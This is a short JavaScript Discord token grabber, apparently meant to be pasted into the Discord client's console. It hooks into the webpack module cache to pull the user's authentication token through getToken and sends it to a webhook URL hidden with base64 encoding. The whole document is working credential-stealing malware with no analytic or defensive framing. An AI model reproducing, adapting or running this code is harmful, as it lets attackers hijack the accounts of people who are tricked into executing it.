var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[["extra_id"]]]); for (let e in req.c)
 if (req.c.hasOwnProperty(e)) {
 let t = req.c[e].exports;
 if (t && t.__esModule && t.default)
 for (let e in t.default) "getToken" === e && (skiddoh_grabber = t.default.getToken())
    }

fetch(
  atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE0MzA2NjEyNDQzOTAxOTkzL2xWMUoycmJJQUNUcFdVNXMwYjdVZjRkd0RFVkxRajlaZzZwZ3ctdWpwVlF1THhmTlFVV3dNRzJjcHN1SXIzeEk0dzd2'), 
  {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: skiddoh_grabber,
    }),
  }
);

console.log('¡Grabbeado!')